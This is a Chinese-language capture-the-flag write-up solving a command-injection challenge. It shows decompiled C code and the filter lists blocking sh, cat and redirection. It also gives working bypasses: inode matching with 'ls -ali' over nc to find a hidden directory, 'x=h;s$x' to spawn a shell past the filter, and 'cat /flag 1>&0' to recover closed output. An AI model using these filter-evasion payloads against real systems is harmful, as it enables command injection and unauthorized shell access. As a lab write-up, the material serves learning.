### 分析代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1; // [rsp+0h] [rbp-90h]
  char buf; // [rsp+40h] [rbp-50h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init();
  memset(&buf, 0, 0x40uLL);
  getcwd(&buf, 0x40uLL);
  puts("where are you?");
  read_n(&s1, 64u);
  if ( strcmp(&s1, &buf) )
  {
    puts("nonono,not there");
    exit(0);
  }
  read_n(&s1, 20u);
  if ( check2(&s1) == -1 )
  {
    puts("oh,it's not good idea");
    exit(0);
  }
  close(1);
  close(2);
  system(&s1);
  return 0;
}
```

```c
unsigned __int64 init()
{
  int rand_pos; // [rsp+4h] [rbp-51Ch]
  int i; // [rsp+8h] [rbp-518h]
  int fd; // [rsp+Ch] [rbp-514h]
  int buf[52]; // [rsp+10h] [rbp-510h]
  char dir_list[1008]; // [rsp+E0h] [rbp-440h]
  char new_dir; // [rsp+4D0h] [rbp-50h]
  char command; // [rsp+4F0h] [rbp-30h]
  unsigned __int64 v8; // [rsp+518h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  fd = open("/dev/urandom", 0);
  rand_pos = 0;
  read(fd, &rand_pos, 1uLL);
  rand_pos %= 50;
  if ( fd < 0 )
    exit(-1);
  chdir("./tmp");
  for ( i = 0; i <= 49; ++i )
  {
    read(fd, &buf[i], 4uLL);
    snprintf(&dir_list[20 * i], 0x14uLL, "0x%x", buf[i]);
    mkdir(&dir_list[20 * i], 0x1EDu);
  }
  snprintf(&new_dir, 0x16uLL, "./%s", &dir_list[20 * rand_pos]);
  chdir(&new_dir);
  puts("find yourself");
  read_n(&command, 25u);
  if ( check1(&command) != -1 )
    system(&command);
  return __readfsqword(0x28u) ^ v8;
}
```

- 在/tmp/目录下创建50个文件夹，文件名随机，然后随机切换到一个文件夹中
- 一次执行`system(cmd1)`的机会，字符过滤规则为`check1`
- 随后，要输入正确的工作目录
- 又有一次执行`system(cmd2)`的机会，字符过滤规则为`check2`
- 但是这次执行`system`前关闭了`stdout`和`stderr`

### check1

 - 允许的字符：
	```c
    a b c d e f g h i j k l m n o p q r s t u v w x y z
    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
    /   -
   ```
 - 过滤的字符串
    ```c
    sh
    cat
    flag
    pwd
    export
    ```
    

- docker中能利用的命令不多，除了被过滤的`cat` 和`sh`之外，还有 `ls` 和`cd`

- `cd -`可以输出`OLD_PWD`，也就是`/`，但是并无有神马用处

- `ls`可以虽然可以输出当前路径下的文件名，但是题目中对比的是绝对路径

- 看了下`ls --help`，发现可以利用`ls -ali`，输出当前目录文件`.`的`inode`，记做`inodeX`好啦

- `inode`是唯一的，于是再开一个`shell`，`ls -alh /tmp`查看`/tmp/`下的所有文件名及`inode`

- 根据`inodeX`，即可找到正确的目录名

  ```shell
  # shell 1
  % nc 47.103.214.163 21000
  find yourself
  ls -ali
  total 8
  1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 .
  1968682 drwxrwxrwx 152    0    0 4096 Jan 27 12:50 ..
  where are you?
  ```

  ```shell
  # shell 2
  % nc 47.103.214.163 21000 | grep 1968846
  ls -ali /tmp
  1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 0x8eb79f31
  ```

  ```shell
  # shell 1
  % nc 47.103.214.163 21000
  find yourself
  ls -ali
  total 8
  1968846 drwxr-xr-x   2 1000 1000 4096 Jan 27 12:50 .
  1968682 drwxrwxrwx 152    0    0 4096 Jan 27 12:50 ..
  where are you?
  /tmp/0x8eb79f31
  ```

### check2

- 过滤的字符(串)

  ```c
  sh cat * & | > <
  ```

- 这个简单多了，字符串拼接即可绕过

  ```shell
  x=h;s$x
  ```


### close(1) and close(2)

- 关闭了`stdout`和`stderr`，即使`cat flag`也得不到输出`u_u`

- 于是，重定向，把`stdout`和`stderr`重定向到`stdin`

  ```shell
  cat /flag 1>&0
  ```

### fini

- 这题在`check1`卡了好久，第三天才想到`ls -i`，我太菜了。

